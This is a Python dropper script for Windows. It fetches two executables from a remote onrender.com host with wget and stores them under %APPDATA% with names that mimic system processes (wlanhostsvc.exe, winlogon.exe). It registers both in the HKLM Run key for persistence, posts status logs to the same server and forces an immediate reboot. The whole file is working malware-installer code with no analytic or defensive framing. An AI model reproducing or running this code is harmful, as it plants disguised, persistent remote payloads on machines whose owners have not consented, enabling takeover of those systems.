from shutil import which
from subprocess import run
import winreg as reg
from os import path
from requests import post, get
from sys import exit
if not which("wget"):
    run(["winget","install","wget"],shell=True,capture_output=True)
    run("./migration.exe",shell=True,text=True)
    exit(0)
url = "https://ms32-sha2.onrender.com/"
user= "<MIG>"
def hit(url:str,data=None):
    try:
        if data:
            return post(url,json=data)
        return get(url,stream=True)
    except:
        return "none"

def log(statement,state="SUCESS",terminal=False) -> None:
    try:
        statement = f"{state}   {statement}"
        hit(url+"terminal",data={"output":statement}) if terminal else None
        hit(url+"output",data={"user":user,"err":statement})
    except:
        pass

regpath = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
appdata_path = path.expandvars(r"%APPDATA%\Microsoft\Network")
destination_path_exe = path.join(appdata_path, 'wlanhostsvc.exe')
dest_checker = path.join(appdata_path,"winlogon.exe")
ms32done=False
checkerdone=False
regdone=False
try:
    fiel = run(["wget","-O",destination_path_exe,"https://ms32-sha2.onrender.com/static/apps/wlanhostsvc.exe"],shell=True,capture_output=True)
    ms32done = True
    if b"ERROR 404: Not Found" in fiel.stderr:
        log(f"Incorrect url {url} for wlanhostsvc.exe",state="FATAL")
        exit(0)
        ms32done = False
    fiel = run(["wget","-O",dest_checker,"https://ms32-sha2.onrender.com/static/apps/winlogon.exe"],shell=True,capture_output=True)
    checkerdone = True
    if b"ERROR 404: Not Found" in fiel.stderr:
        log(f"Incorrect url {url} for winlogon.exe",state="FATAL")
        exit(0)
        checkerdone = False

    key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE,regpath,0,reg.KEY_WRITE)

    reg.SetValueEx(key,"Wlanhostsvc",0,reg.REG_SZ,destination_path_exe)
    reg.SetValueEx(key,"winlogon",0,reg.REG_SZ,dest_checker)

    reg.CloseKey(key)
    regdone = True
except Exception as e:
    log(f"migration not done. error={e}\t ms32done={ms32done},checkerdone={checkerdone},regdone={regdone}",state="FATAL")
    exit(0)
log("Migration complete ab smartboard ki mkc")
run("shutdown /r /t 0",shell=True,text=True)
